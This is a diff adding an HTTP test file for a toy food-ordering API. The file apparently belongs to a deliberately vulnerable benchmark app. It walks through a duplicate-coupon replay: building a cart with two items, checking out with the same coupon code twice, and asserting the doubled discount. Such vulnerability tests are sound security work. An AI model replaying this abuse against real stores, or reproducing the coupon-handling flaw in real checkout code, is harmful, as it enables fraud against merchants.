@@ -1,0 +1,83 @@
+# @import ../_imports.http
+
+# POST /cart/{id}/checkout vulnerability test - Duplicate Coupon Replay (v403 ONLY)
+#
+# The Exploit:
+# 1. Create a cart and add multiple Krabby Patties
+# 2. Submit checkout with duplicate coupon codes: ["BURGER-50", "BURGER-50"]
+# 3. Each occurrence in the array applies the discount to a different item
+# 4. Customer gets double the discount they should
+#
+# The vulnerability: apply_coupons_to_order_items() iterates the original coupon_codes
+# list (which may contain duplicates) while validation only deduplicates single-use
+# coupons. Non-single-use coupons like BURGER-50 apply multiple times.
+#
+# BURGER-50: 50% off Krabby Patty ($3.99 -> $2.00)
+# With exploit: Two Krabby Patties at 50% each = $2.00 + $2.00 = $4.00 subtotal
+# Expected (honest): One coupon = $2.00 + $3.99 = $5.99 subtotal
+# Delivery fee: $5.00 (subtotal < $10)
+
+### Setup - seed balance and create cart with multiple items
+# @name setup_duplicate_coupon
+{{
+  await platform.seed({ plankton: 200 });
+}}
+# @tag cart, r04, v403, vulnerable
+POST /cart?restaurant_id=1
+Authorization: {{auth.basic("plankton")}}
+
+@cart_id = {{$(response).field("cart_id")}}
+?? js $(response).status() == 201
+
+### Add first Krabby Patty
+# @name add_first_patty
+# @forceRef setup_duplicate_coupon
+# @ucskip
+# @tag cart, r04, v403, vulnerable
+POST /cart/{{cart_id}}/items
+Authorization: {{auth.basic("plankton")}}
+Content-Type: application/json
+
+{"item_id": "{{menu.item("Krabby Patty").id}}"}
+
+?? js $(response).isOk() == true
+?? js $(response).field("items").length == 1
+
+### Add second Krabby Patty
+# @name add_second_patty
+# @forceRef add_first_patty
+# @ucskip
+# @tag cart, r04, v403, vulnerable
+POST /cart/{{cart_id}}/items
+Authorization: {{auth.basic("plankton")}}
+Content-Type: application/json
+
+{"item_id": "{{menu.item("Krabby Patty").id}}"}
+
+?? js $(response).isOk() == true
+?? js $(response).field("items").length == 2
+
+### Checkout with duplicate coupon codes - EXPLOIT
+# @name checkout_duplicate
+# @forceRef add_second_patty
+# @tag cart, r04, v403, vulnerable
+POST /cart/{{cart_id}}/checkout
+Authorization: {{auth.basic("plankton")}}
+Content-Type: application/json
+
+{"delivery_address": "Chum Bucket", "tip": 0, "coupon_codes": ["BURGER-50", "BURGER-50"]}
+
+# EXPLOIT: Order completes successfully
+?? js $(response).status() == 201
+?? js $(response).hasFields("order_id", "total", "items") == true
+
+# EXPLOIT: Total should be higher if coupon only applied once
+# With exploit: ($3.99 - $2.00) + ($3.99 - $2.00) + $5.00 delivery = $8.98
+# Without exploit: ($3.99 - $2.00) + $3.99 + $5.00 delivery = $10.98
+# The exploit saves $2.00!
+?? js $(response).total() == 8.98
+
+# EXPLOIT: Discount field shows double discount was applied
+# Single coupon: 50% of $3.99 = $2.00 discount
+# Double coupon: 2 x $2.00 = $4.00 discount (approximate due to rounding)
+?? js parseFloat($(response).field("discount")) > 3
